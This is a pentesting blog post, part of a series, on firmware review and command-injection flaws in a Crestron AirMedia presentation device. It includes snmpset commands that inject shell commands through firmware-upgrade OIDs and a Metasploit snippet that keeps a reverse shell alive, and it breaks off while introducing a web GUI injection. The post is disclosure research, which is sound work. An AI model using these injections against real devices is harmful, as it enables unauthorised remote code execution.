---
layout: post
title:  "Man-in-the-Conference-Room - Part IV (Vulnerability Research & Development)"
date:   2019-03-27 10:00:00
comments: true
categories: pentesting
---


In this fourth installation of my blog series about wireless presentation devices we'll cover one of the part I really love: **vulnerability research and development**.

I'll focus on network services discovered and reverse engineered in **part III** ([Man-in-the-conference-room - Part III (Network Assessment)]({{site.url}}/pentesting/2019/03/26/awind-device-network/)) and will use firmware dumps acquired during **part II** ([Man-in-the-conference-room - Part II (Hardware Hacking)]({{site.url}}pentesting/2019/03/25/awind-device-hardware/)). If you didn't read these previous posts, please do so :)


### 1. Firmware Mount & Source Review

We'll start by mounting the root filesystem we acquired with our firmware dumping script:

<pre>
$ sudo losetup -v -f mmc_dump.bin
$ sudo losetup -a
/dev/loop0: [0046]:9755872 (/home/quentin/research/airmedia/hardware/dumps/dd/mmc_dump.bin)
$ sudo partx --show /dev/loop0
NR   START     END SECTORS   SIZE NAME UUID
 1      16  500975  500960 244,6M
 2  500976 1001951  500976 244,6M
 3 1001952 3002831 2000880   977M
 4 3002832 6909839 3907008   1,9G
$ sudo partx -v --add /dev/loop0
partition: none, disk: /dev/loop0, lower: 0, upper: 0
/dev/loop0: partition table type 'dos' detected
/dev/loop0: partition #1 added
/dev/loop0: partition #2 added
/dev/loop0: partition #3 added
/dev/loop0: partition #4 added
$ sudo blkid /dev/loop0*
/dev/loop0: PTTYPE="dos"
/dev/loop0p1: UUID="6e4f610d-796f-4b15-8b21-f3da4538f09b" TYPE="ext2"
/dev/loop0p2: UUID="1ce0eb6b-4733-44e8-9b4d-761597dd4a36" TYPE="ext2"
/dev/loop0p3: UUID="7A5C-49D2" TYPE="vfat"
/dev/loop0p4: LABEL="InternalMem" UUID="7A69-9C39" TYPE="vfat"
$ sudo mount -o ro /dev/loop0p2 /mnt/tmp
</pre>

My first step here is to list custom shell script that have been added by the manufacturer:

<pre>
$ cd /mnt/tmp && find -name "*.sh"
./mnt/set_ap_client.sh
./mnt/wpsd/stopWPSD.sh
./mnt/wpsd/startWPSD.sh
./bin/update_parameters.sh
./bin/ftpfw.sh
./bin/run_upload_file.sh
./bin/wifi_client_stat.sh
./bin/RemoteFirmware.sh
./bin/Mmcblk1p4Process.sh
./bin/UpgradeProcess.sh
./bin/service_onoff.sh
./bin/nsupdate.sh
./bin/getRemoteURL.sh
./bin/usbhid.sh
./bin/mountstor.sh
./etc/ralink_wireless_tx_power_survey.sh
./etc/finish_upgrade.sh
./etc/wifi_hotplug.sh
./etc/preUpgrade.sh
./etc/auto_edid_detect.sh
./etc/reSyncNtp.sh
./etc/wifi_reset.sh
./etc/rfdetect.sh
./etc/getWirelessAddr.sh
./etc/wifi_adaptive_survey.sh
./etc/AirPlayerProcess.sh
./etc/netdriver.sh
./etc/reboot.sh
./etc/apclient_site_survey.sh
./usr/local/awind/rftest.sh
./usr/local/awind/create_CA.sh
./usr/local/awind/sync_res.sh
./usr/local/awind/make_pns_token.sh
./usr/bin/ftptest.sh
./usr/bin/vpp_out.sh
./usr/bin/wp.sh
./usr/bin/notice.sh
./usr/bin/printenv.sh
./usr/bin/modify_res.sh
./usr/bin/setenv.sh
./usr/bin/wmt-ut.sh
</pre>

After a manual code review of those scripts, I identified potentialy harmful code in the following scripts:

* bin/getRemoteURL.sh
* bin/service_onoff.sh
* bin/ftpfw.sh

**getRemoteURL.sh**

When an administrator wants to set a custom logo on the idle screen it has two options: either upload it manually or get the device to fetch it from a remote FTP or HTTP server. This script is launched when the latter is used. Here is the script with some comments of mine:

{% highlight bash %}
#!/bin/sh

url=$1
ftpaccount=$2
ftppawd=$3
ftpport=$4

urlType=`echo "$url"  | cut -d ':' -f 1`

if [ "$urlType" == "ftp" ]; then

    ftphost=`echo "$url"  | cut -d '/' -f 3`
    ftpurl=`echo "$url"  | cut -d '/' -f 4-`

    if [ "$ftpaccount" == "" ]; then
	echo "missing ftp account"
        /mnt/AwGetCfg set SYSLOG_ERROR_CODE -12
        exit 1
    fi

    if [ "$ftphost" == "" ]; then
	echo "missing ftp host"
        /mnt/AwGetCfg set SYSLOG_ERROR_CODE -11
        exit 1
    fi

    if [ "$ftppawd" == "" ]; then
        echo "/usr/sbin/ftpget -v -u $ftpaccount -p \"\" $ftphost -P $ftpport /tmp/Example.ogg $ftpurl" >> /tmp/ftpget.log
        # NO SHELL ESCAPE !
        /usr/sbin/ftpget -v -u $ftpaccount -p "" $ftphost -P $ftpport /tmp/Example.ogg $ftpurl
    else
        echo "/usr/sbin/ftpget -v -u $ftpaccount -p $ftppawd $ftphost -P $ftpport /tmp/Example.ogg $ftpurl" >> /tmp/ftpget.log
        # NO SHELL ESCAPE !
        /usr/sbin/ftpget -v -u $ftpaccount -p $ftppawd $ftphost -P $ftpport /tmp/Example.ogg $ftpurl
    fi
else
    #/usr/bin/wget $url -O /tmp/Example.ogg
    # NO SHELL ESCAPE !
    /usr/bin/curl -k -o /tmp/Example.ogg $url
fi

err=$?
if [ $err != 0 ]; then
    echo "ftpget or wget error"
    /mnt/AwGetCfg set SYSLOG_ERROR_CODE -10
    exit 1
fi
{% endhighlight %}

**service_onoff.sh**

This script is used to enable/disable services such as network services or USB support. Once again, comments are mine.

```bash
#!/bin/sh
ACTION=$1
SERVICE=$2
ONOFF=$3

if [ "$ACTION" = "get" ];then
    echo "Please use AwGetCfg"
else [ "$ACTION" = "set" ]

    [ -f "/tmp/serviceLock" ] && exit 1
    echo "1" > /tmp/serviceLock
    # --- SNIPPED CONTENT ---
    # NO SHELL ESCAPE !
    /mnt/AwGetCfg set $SERVICE $ONOFF
    /bin/rm /tmp/serviceLock -f && exit 0
fi
```

**ftpfw.sh**

This script seems to be used to download a firmware update over FTP and apply it:

```bash
#!/bin/sh

# --- SNIPPED CONTENT ---
ftpaccount=$1
ftppawd=$2
ftphost=$3
ftpport=$4
ftpurl=$5

if [ -f /tmp/scdecapp.pid ]; then
    echo "stop wps" >> /tmp/ftpget.log
    wps_pid=`cat /tmp/scdecapp.pid`
    kill -26 $wps_pid
    while [ -f /tmp/scdecapp.pid ] ; do
        echo "wait until kill wps is success"
        sleep 1
    done
fi

if [ "$2" == "" ]; then
    echo "/usr/sbin/ftpget -v -u $ftpaccount -p \"\" $ftphost -P $ftpport /tmp/romfs $ftpurl" >> /tmp/ftpget.log
    # NO SHELL ESCAPE !
    /usr/sbin/ftpget -v -u $ftpaccount -p "" $ftphost -P $ftpport /tmp/romfs $ftpurl
else
    echo "/usr/sbin/ftpget -v -u $ftpaccount -p $ftppawd $ftphost -P $ftpport /tmp/romfs $ftpurl" >> /tmp/ftpget.log
    # NO SHELL ESCAPE !
    /usr/sbin/ftpget -v -u $ftpaccount -p $ftppawd $ftphost -P $ftpport /tmp/romfs $ftpurl
fi
# --- SNIPPED CONTENT ---
```

---

By grepping for those scripts names, we can identify that they are launched by one of the web server's CGI script (**return.cgi**), the SNMP server (**snmpd**) and a custom Airmedia binary (**CIPBridge**):

<pre>
$ grep getRemoteURL . -r
Binary file ./home/boa/cgi-bin/return.cgi matches
Binary file ./usr/bin/snmpd matches
Binary file ./usr/bin/CIPBridge matches
$ grep service_onoff . -r
Binary file ./home/boa/cgi-bin/return.cgi matches
Binary file ./usr/bin/snmpd matches
Binary file ./usr/bin/CIPBridge matches
$ grep ftpfw . -r
Binary file ./usr/bin/snmpd matches
</pre>

We can also check *how* they're launched using *strings* and grepping for script names:

<pre>
$ strings ./home/boa/cgi-bin/return.cgi | grep -E "getRemote|service_onoff"
/bin/service_onoff.sh set %s %s
/bin/getRemoteURL.sh %s
/bin/getRemoteURL.sh "%s" "%s" "%s" "%s"
$ strings ./usr/bin/snmpd | grep -E "getRemote|service_onoff|ftpfw"
/bin/ftpfw.sh %s %s %s %d %s &
/bin/service_onoff.sh set
/bin/getRemoteURL.sh %s %s %s %d
$ strings ./usr/bin/CIPBridge | grep -E "getRemote|service_onoff|ftpfw"
/bin/service_onoff.sh set WEB_ONOFF 1 &
/bin/service_onoff.sh set WEB_ONOFF 0 &
/bin/service_onoff.sh set SNMP_ONOFF 1 &
/bin/service_onoff.sh set SNMP_ONOFF 0 &
/bin/service_onoff.sh set CIP_ONOFF 1 &
/bin/service_onoff.sh set CIP_ONOFF 0 &
/bin/getRemoteURL.sh %s %s %s %d
</pre>

Ok so we might be onto something here. Let's recap with a quick diagram of sources and sinks:

![awind_sources_sinks]({{site.url}}/assets/awind_sources_sinks.png)

**Note**: CIPBridge was purposefuly dropped because it's a service that must be configured to talk to a Crestron Virtual Server which is only available to Crestron customers, which I'm not. Still, if anyone got that software it is worth looking into it.

### 2. Bug Triaging and Exploit Implementation

#### 2.1 Remote Command Execution via SNMP

The first step to check if we can reach sinks via SNMP is to load the custom [MIB](https://en.wikipedia.org/wiki/Management_information_base) from Airmedia. That MIB file can be extracted from specific firmware archives available on Crestron [support website](https://www.crestron.com/Products/Workspace-Solutions/Wireless-Presentation-Solutions/AirMedia-Presentation-Gateways/AM-101). These ZIP archives holds firmware images for each processor family, a manifest, release notes, and the custom MIB file we are looking for:

<pre>
$ unzip software_airmedia_am-100_1.5.0_am-101_2.6.0_firmware.zip -d firmware
Archive:  software_airmedia_am-100_1.5.0_am-101_2.6.0_firmware.zip
inflating: firmware/am-100_am-101_release_notes.html
inflating: firmware/AM-100_firmware_1.5.0.3_6507044_WM8750.img
inflating: firmware/AM-100_firmware_1.5.0.4_6506508_WM8440.img
inflating: firmware/AM-101_firmware_2.6.0.12_6508053_WM8750A.img
inflating: <b>firmware/crestron_AirMedia.mib</b>
inflating: firmware/Manifest.xml
</pre>

On a Linux based host you just have to copy the MIB file to `~/.snmp/mibs`. Once it's copied there, you can use `snmptranslate` to lookup items within the MIB:

<pre>
$ for object in `snmptranslate -m +CRESTRON-WPS-MIB -TB 'cam*'`; do echo $object; snmptranslate -m +CRESTRON-WPS-MIB -IR -On $object; done > translated_mibs.txt
</pre>

With this one line you'll get each SNMP OID and corresponding name:

<details>
<summary style="background-color:#f6f7f8;padding: 15px;border-color:gray;border-style: solid;border-width: 1px;">Crestron Airmedia SNMP OIDs</summary>
<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code><span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">crestron</span>
.1.3.6.1.4.1.3212
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">crestronAirMediaMIB</span>
.1.3.6.1.4.1.3212.100
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camMIB</span>
.1.3.6.1.4.1.3212.100.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camAddOnMIBObjects</span>
.1.3.6.1.4.1.3212.100.3.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSelectiveServices</span>
.1.3.6.1.4.1.3212.100.3.3.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceSNMPOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceRemoteViewOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceCIPSet</span>
.1.3.6.1.4.1.3212.100.3.3.2.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceCrestronUpdateOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.2.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceCrestronOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.2.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebSet</span>
.1.3.6.1.4.1.3212.100.3.3.2.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebAdminOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.1.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebModerationOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.1.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.1.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camConferenceCtrl</span>
.1.3.6.1.4.1.3212.100.3.3.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camCCPassword</span>
.1.3.6.1.4.1.3212.100.3.3.1.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camCCEnableModerator</span>
.1.3.6.1.4.1.3212.100.3.3.1.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camConferenceCtrlTable</span>
.1.3.6.1.4.1.3212.100.3.3.1.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camConferenceCtrlEntry</span>
.1.3.6.1.4.1.3212.100.3.3.1.1.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camCCConnected</span>
.1.3.6.1.4.1.3212.100.3.3.1.1.1.5
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camCCWindowPosition</span>
.1.3.6.1.4.1.3212.100.3.3.1.1.1.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camCCUserIPAddress</span>
.1.3.6.1.4.1.3212.100.3.3.1.1.1.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camCCUserName</span>
.1.3.6.1.4.1.3212.100.3.3.1.1.1.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camCCIndex</span>
.1.3.6.1.4.1.3212.100.3.3.1.1.1.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camMIBObjects</span>
.1.3.6.1.4.1.3212.100.3.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPConf</span>
.1.3.6.1.4.1.3212.100.3.2.10
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPV3Set</span>
.1.3.6.1.4.1.3212.100.3.2.10.5
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPV3PrivacyPassword</span>
.1.3.6.1.4.1.3212.100.3.2.10.5.5
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPV3PrivacyProtocol</span>
.1.3.6.1.4.1.3212.100.3.2.10.5.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPV3AuthPassword</span>
.1.3.6.1.4.1.3212.100.3.2.10.5.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPV3AuthProtocol</span>
.1.3.6.1.4.1.3212.100.3.2.10.5.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPV3UserName</span>
.1.3.6.1.4.1.3212.100.3.2.10.5.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPV2Set</span>
.1.3.6.1.4.1.3212.100.3.2.10.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPPrivateCommunity</span>
.1.3.6.1.4.1.3212.100.3.2.10.4.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPPublicCommunity</span>
.1.3.6.1.4.1.3212.100.3.2.10.4.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPManagerHostname</span>
.1.3.6.1.4.1.3212.100.3.2.10.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPVersion</span>
.1.3.6.1.4.1.3212.100.3.2.10.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSNMPTrapHost</span>
.1.3.6.1.4.1.3212.100.3.2.10.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgrade</span>
.1.3.6.1.4.1.3212.100.3.2.9
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWDownloadUpgradePercentage</span>
.1.3.6.1.4.1.3212.100.3.2.9.7
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeStatus</span>
.1.3.6.1.4.1.3212.100.3.2.9.6
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPActive</span>
.1.3.6.1.4.1.3212.100.3.2.9.5
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPPasswd</span>
.1.3.6.1.4.1.3212.100.3.2.9.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPAccount</span>
.1.3.6.1.4.1.3212.100.3.2.9.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPPort</span>
.1.3.6.1.4.1.3212.100.3.2.9.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPURL</span>
.1.3.6.1.4.1.3212.100.3.2.9.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSystem</span>
.1.3.6.1.4.1.3212.100.3.2.8
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSystemRebootRequired</span>
.1.3.6.1.4.1.3212.100.3.2.8.5
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSystemReboot</span>
.1.3.6.1.4.1.3212.100.3.2.8.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camProjection</span>
.1.3.6.1.4.1.3212.100.3.2.7
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camProjectionLoginCodeInput</span>
.1.3.6.1.4.1.3212.100.3.2.7.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camProjectionLoginCodeCurrentOption</span>
.1.3.6.1.4.1.3212.100.3.2.7.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camProjectionCurrentTotalUsers</span>
.1.3.6.1.4.1.3212.100.3.2.7.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camProjectionCurrentStatus</span>
.1.3.6.1.4.1.3212.100.3.2.7.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSource</span>
.1.3.6.1.4.1.3212.100.3.2.6
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputCurrentSource</span>
.1.3.6.1.4.1.3212.100.3.2.6.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSourceTable</span>
.1.3.6.1.4.1.3212.100.3.2.6.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSourceEntry</span>
.1.3.6.1.4.1.3212.100.3.2.6.1.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSourceVResolution</span>
.1.3.6.1.4.1.3212.100.3.2.6.1.1.5
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSourceHResolution</span>
.1.3.6.1.4.1.3212.100.3.2.6.1.1.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSourceDescription</span>
.1.3.6.1.4.1.3212.100.3.2.6.1.1.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSourceImplemented</span>
.1.3.6.1.4.1.3212.100.3.2.6.1.1.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camOutputSourceIndex</span>
.1.3.6.1.4.1.3212.100.3.2.6.1.1.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camInfo</span>
.1.3.6.1.4.1.3212.100.3.2.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camInfoHWVersion</span>
.1.3.6.1.4.1.3212.100.3.2.1.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camInfoReleateDate</span>
.1.3.6.1.4.1.3212.100.3.2.1.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camInfoFWVersion</span>
.1.3.6.1.4.1.3212.100.3.2.1.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camInfoModelName</span>
.1.3.6.1.4.1.3212.100.3.2.1.1</code></pre></div></div>
</details>


First, we don't see any OID that could help us reach **getRemoteURL.sh**, at least from the naming convention. A cursory search through the plain MIB files didn't bring up anything related to this feature. This is a dead end.

---

As for **service_onoff.sh**, we can consider the following candidates:

<details>
<summary style="background-color:#f6f7f8;padding: 15px;border-color:gray;border-style: solid;border-width: 1px;">Crestron Airmedia SNMP OIDs (services on/off)</summary>
<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code><span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camSelectiveServices</span>
.1.3.6.1.4.1.3212.100.3.3.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceSNMPOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceRemoteViewOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceCIPSet</span>
.1.3.6.1.4.1.3212.100.3.3.2.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceCrestronUpdateOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.2.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceCrestronOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.2.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebSet</span>
.1.3.6.1.4.1.3212.100.3.3.2.1
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebAdminOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.1.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebModerationOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.1.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camServiceWebOnOff</span>
.1.3.6.1.4.1.3212.100.3.3.2.1.1</code></pre></div></div>
</details>

All these OIDs expects a value of type *CAMSelectiveServiceTypeTC*:

<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code>camserviceSNMPOnOff <span class="nv">OBJECT-TYPE</span>
    <span class="nv">SYNTAX</span> CAMSelectiveServiceTypeTC
    <span class="nv">MAX-ACCESS</span>  <span class="nb">read-write</span>
    <span class="nv">STATUS</span> <span class="nb">current</span>
    <span class="nv">DESCRIPTION</span>
    <span class="nv">DEFVAL</span> { <span class="mi">1</span> }
    <span class="o">::=</span> { camSelectiveServices <span class="nb">4</span> }
<span class="nv">END</span></code></pre></div></div>

*CAMSelectiveServiceTypeTC* being a boolean, there is no way we can inject here :(

<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code>CAMSelectiveServiceTypeTC <span class="o">::=</span> <span class="nv">TEXTUAL-CONVENTION</span>
    <span class="nv">STATUS</span>  <span class="nb">current</span>
    <span class="nv">DESCRIPTION</span>
        <span class="s2">"TC for enumerated property camSelectiveServices."</span>
    <span class="nv">SYNTAX</span> <span class="nv">INTEGER</span> {
        <span class="nb">off</span>(<span class="mi">0</span>),
        <span class="nb">on</span>(<span class="mi">1</span>)
    }</code></pre>
</div></div>

---

Let's move onto our last sink: **ftpfw.sh**. Here it is pretty obvious that there are ways to it:

<details>
<summary style="background-color:#f6f7f8;padding: 15px;border-color:gray;border-style: solid;border-width: 1px;">Crestron Airmedia SNMP OIDs (firmware upgrade)</summary>
<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code><span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgrade</span>
.1.3.6.1.4.1.3212.100.3.2.9
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWDownloadUpgradePercentage</span>
.1.3.6.1.4.1.3212.100.3.2.9.7
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeStatus</span>
.1.3.6.1.4.1.3212.100.3.2.9.6
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPActive</span>
.1.3.6.1.4.1.3212.100.3.2.9.5
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPPasswd</span>
.1.3.6.1.4.1.3212.100.3.2.9.4
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPAccount</span>
.1.3.6.1.4.1.3212.100.3.2.9.3
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPPort</span>
.1.3.6.1.4.1.3212.100.3.2.9.2
<span class="nv">CRESTRON-WPS-MIB</span><span class="o">::</span><span class="nb">camFWUpgradeFTPURL</span>
.1.3.6.1.4.1.3212.100.3.2.9.1</code></pre></div></div>
</details>

If you remember the shell script lacking proper input sanitization, it seems the following OIDs could be used to inject our payload:

* *camFWUpgradeFTPPasswd*
* *camFWUpgradeFTPAccount*
* *camFWUpgradeFTPPort*
* *camFWUpgradeFTPURL*

Then, *camFWUpgradeFTPActive* can be used to trigger the firmware upgrade, and therefore the call to **ftpfw.sh**:

<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code>camFWUpgradeFTPActive <span class="nv">OBJECT-TYPE</span>
    <span class="nv">SYNTAX</span> <span class="nb">Integer32</span>
    <span class="nv">MAX-ACCESS</span>  <span class="nb">read-write</span>
    <span class="nv">STATUS</span> <span class="nb">current</span>
    <span class="nv">DESCRIPTION</span>
        <span class="s2">"1: start to upgrade"</span>
    <span class="o">::=</span> <span class="o">{</span> camFWUpgrade <span class="mi">5</span> <span class="o">}</span></code></pre>
</div></div>

Ok. Let's give it a try by injecting a payload in the FTP account value. Note that the string must be an exact length, hence the padding of A's.

<pre>
$ snmpset -v2c -c private -m +CRESTRON-WPS-MIB 192.168.100.2 camFWUpgradeFTPAccount.0 s '$(ping -c 3 192.168.100.1)AAAAA'
CRESTRON-WPS-MIB::camFWUpgradeFTPAccount.0 = STRING: $(ping -c 3 192.168.100.1)AAAAA
</pre>

Now we trigger the upgrade sequence:
<pre>
$ snmpset -v2c -c private -m +CRESTRON-WPS-MIB 192.168.100.2 camFWUpgradeFTPActive.0 i 1
CRESTRON-WPS-MIB::camFWUpgradeFTPActive.0 = INTEGER: 1
</pre>

And voilà ! Remote command execution via SNMP:
<pre>
13:04:31.599851 IP 192.168.100.2 > 192.168.100.1: ICMP echo request, id 60686
13:04:31.599925 IP 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 60686
13:04:32.601065 IP 192.168.100.2 > 192.168.100.1: ICMP echo request, id 60686
13:04:32.601100 IP 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 60686
13:04:33.604441 IP 192.168.100.2 > 192.168.100.1: ICMP echo request, id 60686
13:04:33.604538 IP 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 60686
</pre>

During the development of a full blown exploit I came upon two issues:

1. The SNMP service expects a really specific format for the FTP URL
2. The reverse shell exits after a few seconds

The expected URL value must be 255 bytes long and starts with a valid URI, while the shell exit is due to this call at the end of **ftpfw.sh**:

{% highlight bash %}
if [ $err1 != 0 ]; then
    echo "[Error]fw: $err1" >> /tmp/ftpget.log
    /etc/reboot.sh
    exit 3
fi
{% endhighlight %}

The fix was fairly simple, here is how it looks like in the Metasploit module:

{% highlight bash %}
# The payload must start with a valid FTP URI otherwise the injection point is not reached
cmd = "ftp://1.1.1.1/$(#{payload.encoded})"
# When the FTP download fails, the script calls /etc/reboot.sh and we loose the callback
# We therefore kill /etc/reboot.sh before it reaches /sbin/reboot with that command and
# keep our reverse shell opened :)
cmd += "$(pkill -f /etc/reboot.sh)"
# the MIB states that camFWUpgradeFTPURL must be 255 bytes long so we pad
cmd += "A" * (255-cmd.length)
{% endhighlight %}

And here is the exploit at work:

<script src="https://asciinema.org/a/Kj2VBJg3kGCmy3UPxm2JkzOo0.js" id="asciicast-Kj2VBJg3kGCmy3UPxm2JkzOo0" async></script>

Let's update our sources and sinks diagram with what we learned. One path to **getRemoteURL.sh** via SNMP got removed, the path to **service_onoff.sh** got deactivated and the one to **ftpfw.sh** got confirmed.

![awind_sources_sinks2]({{site.url}}/assets/awind_sources_sinks2.png)

We'll now move onto exploitation by abusing the web GUI running on ports TCP/80 and TCP/443.

#### 2.2 Remote Command Execution via HTTP

Browsing through the web UI, we end up on the "OSD setup" page that let's you select a custom logo, which is exactly the purpose of one of our sinks: **getRemoteURL.sh**.

![airmedia_logo_ui]({{site.url}}/assets/airmedia_logo_ui.png)

The injection is pretty straightforward as we simply put our payload in backticks within the address field:

<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
